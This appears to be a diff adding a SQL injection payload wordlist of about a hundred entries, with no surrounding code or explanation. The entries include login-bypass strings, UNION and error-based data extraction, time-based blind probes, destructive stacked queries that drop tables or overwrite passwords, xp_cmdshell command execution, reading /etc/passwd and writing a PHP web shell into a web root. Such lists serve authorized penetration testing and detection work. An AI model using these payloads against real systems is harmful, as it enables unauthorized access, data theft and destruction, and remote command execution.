@@ -1,0 +1,109 @@
+'
+'
+'
+admin'
+admin'
+admin'--
+'--
+'--
+')--
+')--
+'--
+';--
+';--
+"--
+"--
+")--
+")--
+"--
+";--
+";--
+' OR 1=1--
+' OR '1'='1'--
+" OR "1"="1
+') OR ('1'='1--
+") OR ("1"="1
+' OR 1=1#
+' OR '1'='1'#
+admin' OR 1=1--
+admin' OR '1'='1'--
+admin'--
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL--
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+1' AND 1=1--
+1' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+' AND 1=1 AND '1'='1
+' AND 1=2 AND '1'='1
+1' AND 1=1 AND 1=1
+1' AND 1=2 AND 1=1
+' OR 1=1--
+1' OR '1'='1'--
+1' OR '1'='2'--
+1" OR "1"="1"--
+1" OR "1"="2"--
+' UNION ALL SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+' WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+1 AND SLEEP(5)--
+1' AND SLEEP(5)--
+1 AND pg_sleep(5)--
+' AND pg_sleep(5)--
+1 AND (SELECT SLEEP(5))--
+1' OR SLEEP(5)--
+1) AND SLEEP(5)--
+1)) AND SLEEP(5)--
+1))) AND SLEEP(5)--
+') AND SLEEP(5)--
+')) AND SLEEP(5)--
+'))) AND SLEEP(5)--
+1' UNION SELECT @@version--
+1' UNION SELECT user()--
+1' UNION SELECT database()--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+1' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--
+1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+1' AND (SELECT COUNT(*) FROM users)>0--
+1' AND EXISTS(SELECT * FROM users)--
+1' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
+1' AND LENGTH(database())=4--
+1' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a'--
+1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--
+1; DROP TABLE users--
+1'; DROP TABLE users--
+1; DROP TABLE admin--
+1'; DROP TABLE admin--
+1; DELETE FROM users WHERE 1=1--
+1'; DELETE FROM users WHERE 1=1--
+1; UPDATE users SET password='hacked' WHERE id=1--
+1'; UPDATE users SET password='hacked' WHERE id=1--
+1; INSERT INTO users VALUES('pwned','pass')--
+1'; INSERT INTO users VALUES('pwned','pass')--
+1; CREATE TABLE pwned(data text)--
+1'; CREATE TABLE pwned(data text)--
+1; ALTER TABLE users DROP COLUMN password--
+1'; ALTER TABLE users DROP COLUMN password--
+1; GRANT ALL PRIVILEGES ON *.* TO 'hacker'--
+1'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'--
+1; SELECT '<?php system("id");?>' INTO OUTFILE '/tmp/shell.php'--
+1'; SELECT '<?php system("id");?>' INTO OUTFILE '/tmp/shell.php'--
+1; EXEC xp_cmdshell('id')--
+1'; EXEC xp_cmdshell('id')--
+1; EXEC sp_executesql N'SELECT * FROM users'--
+1'; EXEC sp_executesql N'SELECT * FROM users'--
+1 UNION SELECT LOAD_FILE('/etc/passwd')--
+1 UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
